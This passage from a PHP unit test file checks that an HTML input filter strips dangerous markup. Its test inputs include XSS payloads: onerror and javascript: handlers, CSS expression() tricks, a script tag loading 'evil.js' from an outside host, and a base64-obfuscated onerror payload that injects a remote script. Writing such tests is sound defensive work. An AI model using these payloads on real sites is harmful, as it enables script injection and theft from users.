			],
			'disabled_no_equals_e'     => [
				'string',
				'<img height disabled />',
				'<img />',
				'Test empty alt attribute',
			],
			'test_nested'              => [
				'string',
				'<img src="<img src=x"/onerror=alert(1)//>" />',
				'<img src="&lt;img src=x&quot;/onerror=alert(1)//&gt;" />',
				'Test empty alt attribute',
			],
			'infinte_loop_a'           => [
				'string',
				'<img src="x" height = "zzz" />',
				'<img src="x" height="zzz" />',
				'Test empty alt attribute',
			],
			'infinte_loop_b'           => [
				'string',
				'<img src = "xxx" height = "zzz" />',
				'<img src="xxx" height="zzz" />',
				'Test empty alt attribute',
			],
			'quotes_in_text'           => [
				'string',
				$quotesInText1,
				$quotesInText2,
				'Test valid nested tag',
			],
			'normal_nested'            => [
				'string',
				$normalNested1,
				$normalNested2,
				'Test valid nested tag',
			],
			'hanging_quote'            => [
				'string',
				"<img src=\' />",
				'<img src="" />',
				'From specific cases',
			],
			'hanging_quote2'           => [
				'string',
				'<img src slkdjls " this is "more " stuff',
				'img src slkdjls " this is "more " stuff',
				'From specific cases',
			],
			'hanging_quote3'           => [
				'string',
				"<img src=\"\' />",
				'img src="\\\' /&gt;"',
				'From specific cases',
			],
			'tracker25558a'            => [
				'string',
				'<SCRIPT SRC=http://jeffchannell.com/evil.js#<B />',
				'SCRIPT SRC=http://jeffchannell.com/evil.js#<B />',
				'Test mal-formed element from 25558a',
			],
			'tracker25558b'            => [
				'string',
				'<IMG STYLE="xss:expression(alert(\'XSS\'))" />',
				'<IMG style="xss(alert(\'XSS\'))" />',
				'Test mal-formed element from 25558b',
			],
			'tracker25558c'            => [
				'string',
				'<IMG STYLE="xss:expr/*XSS*/ession(alert(\'XSS\'))" />',
				'<IMG style="xss(alert(\'XSS\'))" />',
				'Test mal-formed element from 25558b',
			],
			'tracker25558d'            => [
				'string',
				'<IMG STYLE="xss:expr/*XSS*/ess/*another comment*/ion(alert(\'XSS\'))" />',
				'<IMG style="xss(alert(\'XSS\'))" />',
				'Test mal-formed element from 25558b',
			],
			'tracker25558e'            => [
				'string',
				'<b><script<b></b><alert(1)</script </b>',
				'<b>script<b></b>alert(1)/script</b>',
				'Test mal-formed element from 25558e',
			],
			'security_20110329a'       => [
				'string',
				"<img src='<img src='///'/> ",
				"<img src=\"'&lt;img\" src=\"'///'/\" /> ",
				'From specific cases',
			],
			'html_01'                  => [
				'html',
				'<div>Hello</div>',
				'<div>Hello</div>',
				'Generic test case for HTML cleaning',
			],
			'tracker26439a'            => [
				'string',
				'<p>equals quote =" inside valid tag</p>',
				'<p>equals quote =" inside valid tag</p>',
				'Test quote equals inside valid tag',
			],
			'tracker26439b'            => [
				'string',
				"<p>equals quote =' inside valid tag</p>",
				"<p>equals quote =' inside valid tag</p>",
				'Test single quote equals inside valid tag',
			],
			'forward_slash'            => [
				'',
				'<textarea autofocus /onfocus=alert(1)>',
				'<textarea />',
				'Test for detection of leading forward slashes in attributes',
			],
			'tracker25558f'            => [
				'string',
				'<a href="javas&Tab;cript:alert(&tab;document.domain&TaB;)">Click Me</a>',
				'<a>Click Me</a>',
				'Test mal-formed element from 25558f',
			],
			'Attribute with dash'      => [
				'string',
				'<img data-value="1" />',
				'<img data-value="1" />',
				'From generic cases',
			],
		];

		return array_merge($this->casesGeneric(), $casesSpecific);
	}

	/**
	 * Execute a test case with clean() default blocked filter settings (strips bad tags).
	 *
	 * @param   string  $type     The type of input
	 * @param   string  $data     The input
	 * @param   string  $expect   The expected result for this test.
	 * @param   string  $message  The failure message identifying the source of the test case.
	 *
	 * @return  void
	 *
	 * @dataProvider blocked
	 */
	public function testCleanWithDefaultBlockedProperties($type, $data, $expect, $message)
	{
		$this->assertEquals(
			$expect,
			(new InputFilter([], [], 1, 1))->clean($data, $type),
			$message
		);
	}

	/**
	 * Produces the array of test cases for the blocked img tag test run.
	 *
	 * @return  array  Two dimensional array of test cases. Each row consists of three values
	 *                 The first is the type of input data, the second is the actual input data,
	 *                 the third is the expected result of filtering, and the fourth is
	 *                 the failure message identifying the source of the data.
	 */
	public function blockedImg()
	{
		$security20110328String = "<img src='<img src='/onerror=" .
			"eval(atob(/KGZ1bmN0aW9uKCl7dHJ5e3ZhciBkPWRvY3VtZW50LGI9ZC5ib2R5LHM9ZC5jcmVhdGVFbGV" .
			"tZW50KCdzY3JpcHQnKTtzLnNldEF0dHJpYnV0ZSgnc3JjJywnaHR0cDovL2hhLmNrZXJzLm9yZy94c3MuanMnKTtiLmFwcGVuZENoaWxkKHMpO31jYXRjaChlKXt9fSkoKTs=" .
			"/.source))//'/> ";

		$casesSpecific = [
			'Kill script'                      => [
				'',
				'<img src="javascript:alert();" />',
				'',
				'From specific cases',
			],
			'Unquoted Attribute Without Space' => [
				'',
				'<img height=300>',
				'',
				'From specific cases',
			],
			'Unquoted Attribute'               => [
				'',
				'<img height=300 />',
				'',
				'From specific cases',
			],
			'Single quoted Attribute'          => [
				'',
				'<img height=\'300\' />',
				'',
				'From specific cases',
			],
			'Attribute is zero'                => [
				'',
				'<img height=0 />',
				'',
				'From specific cases',
			],
			'Attribute value missing'          => [
				'',
				'<img height= />',
				'',
				'From specific cases',
			],
			'Attribute without ='              => [
				'',
				'<img height="300" ismap />',
				'',
				'From specific cases',
			],
			'tracker9725'                      => [
				// Test for recursion with single tags
				'string',
				'<img class="one two" />',
				'',
				'From specific cases',
			],
			'security_20110328'                => [
				'string',
				$security20110328String,
				' ',
				'From specific cases',
			],
		];

		return array_merge($this->casesGeneric(), $casesSpecific);
	}

	/**
	 * Execute a test case with clean() using custom img blocked filter settings (strips bad tags).
	 *
	 * @param   string  $type     The type of input
	 * @param   string  $data     The input
	 * @param   string  $expect   The expected result for this test.
	 * @param   string  $message  The failure message identifying the source of the test case.
	 *
	 * @return  void
	 *
	 * @dataProvider blockedImg
	 */
	public function testCleanWithImgBlocked($type, $data, $expect, $message)
	{
		$this->assertEquals(
			$expect,
			(new InputFilter(['img'], [], 1, 1))->clean($data, $type),
			$message
		);
	}

	/**
	 * Produces the array of test cases for the blocked class attribute test run.
	 *
	 * @return  array  Two dimensional array of test cases. Each row consists of three values
	 *                 The first is the type of input data, the second is the actual input data,
	 *                 the third is the expected result of filtering, and the fourth is
	 *                 the failure message identifying the source of the data.
	 */
	public function blockedClass()
	{
		$casesSpecific = [
			'tracker9725'         => [
				// Test for recursion with single tags
				'string',
				'<img class="one two" />',
				'<img />',
				'From specific cases',
			],
			'tracker15673'        => [
				'raw',
				'<ul>
<li><a href="../">презентация</a>)</li>
<li>Елфимова О.Т. Разработка системы отделения космического аппарата Метеор-М в системе MSC.Adams<a style="color: maroon;" href="../../pub/diplom_labors/2016/2016_Elfimova_O_rpz.pdf">диплом</a></li>
</ul>',
				'<ul>
<li><a href="../">презентация</a>)</li>
<li>Елфимова О.Т. Разработка системы отделения космического аппарата Метеор-М в системе MSC.Adams<a style="color: maroon;" href="../../pub/diplom_labors/2016/2016_Elfimova_O_rpz.pdf">диплом</a></li>
</ul>',
				'From generic cases',
			],
			'tracker15673a'       => [
				'string',
				'<ul>
<li><a href="../">презентация</a>)</li>
<li>Елфимова О.Т. Разработка системы отделения космического аппарата Метеор-М в системе MSC.Adams<a style="color: maroon;" href="../../pub/diplom_labors/2016/2016_Elfimova_O_rpz.pdf">диплом</a></li>
</ul>',
				'<ul>
<li><a href="../">презентация</a>)</li>
<li>Елфимова О.Т. Разработка системы отделения космического аппарата Метеор-М в системе MSC.Adams<a style="color: maroon;" href="../../pub/diplom_labors/2016/2016_Elfimova_O_rpz.pdf">диплом</a></li>
</ul>',
				'From generic cases',
			],
			'tracker15673b'       => [
				'string',
				'<h3>Инженеры</h3>
<ul>
<li>Агасиев Т.А. "Программная система для автоматизированной настройки параметров алгоритмов оптимизации"<br />(<a class="text" href="/pub/diplom_labors/2016/2016_Agasiev_T_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Agasiev_T_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Логунова А.О. "Исследование и разработка программного обеспечения определения параметров электрокардиограмм"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Logunova_A_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Logunova_A_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Спасёнов А.Ю. "Разработка экспериментального программного комплекса анализа и интерпретации электрокардиограмм"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Spasenov_A_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Spasenov_A_prezentation.pdf">презентация</a>)</li>
<li>Щетинин В.Н. "Имитационное моделирование эксперимента EXPERT физики радиоактивных пучков"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Shhetinin_V_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Shhetinin_V_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Елфимова О.Т. "Разработка системы отделения космического аппарата "Метеор-М" в системе MSC.Adams" <br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Elfimova_O_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Elfimova_O_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Ранкова А.В. "Исследование и разработка методов и алгоритмов распознавания и селекции наземных стационарных объектов"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Rankova_A_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Rankova_A_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
</ul>',
				'<h3>Инженеры</h3>
<ul>
<li>Агасиев Т.А. "Программная система для автоматизированной настройки параметров алгоритмов оптимизации"<br />(<a href="/pub/diplom_labors/2016/2016_Agasiev_T_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Agasiev_T_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Логунова А.О. "Исследование и разработка программного обеспечения определения параметров электрокардиограмм"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Logunova_A_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Logunova_A_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Спасёнов А.Ю. "Разработка экспериментального программного комплекса анализа и интерпретации электрокардиограмм"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Spasenov_A_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Spasenov_A_prezentation.pdf">презентация</a>)</li>
<li>Щетинин В.Н. "Имитационное моделирование эксперимента EXPERT физики радиоактивных пучков"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Shhetinin_V_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Shhetinin_V_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Елфимова О.Т. "Разработка системы отделения космического аппарата "Метеор-М" в системе MSC.Adams" <br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Elfimova_O_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Elfimova_O_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Ранкова А.В. "Исследование и разработка методов и алгоритмов распознавания и селекции наземных стационарных объектов"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Rankova_A_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Rankova_A_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
</ul>',
				'From generic cases',
			],
			'tracker15673c'       => [
				'raw',
				'<h3>Инженеры</h3>
<ul>
<li>Агасиев Т.А. "Программная система для автоматизированной настройки параметров алгоритмов оптимизации"<br />(<a class="text" href="/pub/diplom_labors/2016/2016_Agasiev_T_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Agasiev_T_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Логунова А.О. "Исследование и разработка программного обеспечения определения параметров электрокардиограмм"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Logunova_A_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Logunova_A_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Спасёнов А.Ю. "Разработка экспериментального программного комплекса анализа и интерпретации электрокардиограмм"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Spasenov_A_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Spasenov_A_prezentation.pdf">презентация</a>)</li>
<li>Щетинин В.Н. "Имитационное моделирование эксперимента EXPERT физики радиоактивных пучков"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Shhetinin_V_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Shhetinin_V_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Елфимова О.Т. "Разработка системы отделения космического аппарата "Метеор-М" в системе MSC.Adams" <br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Elfimova_O_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Elfimova_O_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Ранкова А.В. "Исследование и разработка методов и алгоритмов распознавания и селекции наземных стационарных объектов"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Rankova_A_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Rankova_A_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
</ul>',
				'<h3>Инженеры</h3>
<ul>
<li>Агасиев Т.А. "Программная система для автоматизированной настройки параметров алгоритмов оптимизации"<br />(<a class="text" href="/pub/diplom_labors/2016/2016_Agasiev_T_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Agasiev_T_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Логунова А.О. "Исследование и разработка программного обеспечения определения параметров электрокардиограмм"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Logunova_A_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Logunova_A_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Спасёнов А.Ю. "Разработка экспериментального программного комплекса анализа и интерпретации электрокардиограмм"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Spasenov_A_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Spasenov_A_prezentation.pdf">презентация</a>)</li>
<li>Щетинин В.Н. "Имитационное моделирование эксперимента EXPERT физики радиоактивных пучков"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Shhetinin_V_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Shhetinin_V_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Елфимова О.Т. "Разработка системы отделения космического аппарата "Метеор-М" в системе MSC.Adams" <br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Elfimova_O_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Elfimova_O_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Ранкова А.В. "Исследование и разработка методов и алгоритмов распознавания и селекции наземных стационарных объектов"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Rankova_A_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Rankova_A_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
</ul>',
				'From generic cases',
			],
			'tracker15673d'       => [
				'raw',
				'<li><strong>Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°</strong>. Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°-Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° â€“ Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð° Ð°Ð°Ð°, Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð° â€“ Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° â€“ Ð°Ð°Ð°Ð°Ñ‘Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°, Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°-Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°, Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° â€“ Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°.</li>
</ol>
<p>Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ñ‘Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°: Ð°Ð°Ð°Ð°Ð°Ð°.Ð°Ð°Ð°Ð°Ð°Ð°, Qiwi, Webmoney Ð° Ð°.Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°.</p>
<p>{lang ru} <iframe src="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" width="100%" height="439" allowfullscreen="allowfullscreen"></iframe> {/lang}
<script type="application/ld+json">{
  "@context": "http://schema.org",
  "@type": "VideoObject",
  "name": "Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°",
  "description": "Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ñ‘Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°.",
  "thumbnailUrl": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  "uploadDate": "2015-02-16T12:15:30+12:15",
  "duration": "PT10M51S",
  "embedUrl": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
}</script>
</p>',
				'<li><strong>Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°</strong>. Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°-Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° â€“ Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð° Ð°Ð°Ð°, Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð° â€“ Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° â€“ Ð°Ð°Ð°Ð°Ñ‘Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°, Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°-Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°, Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° â€“ Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°.</li>
</ol>
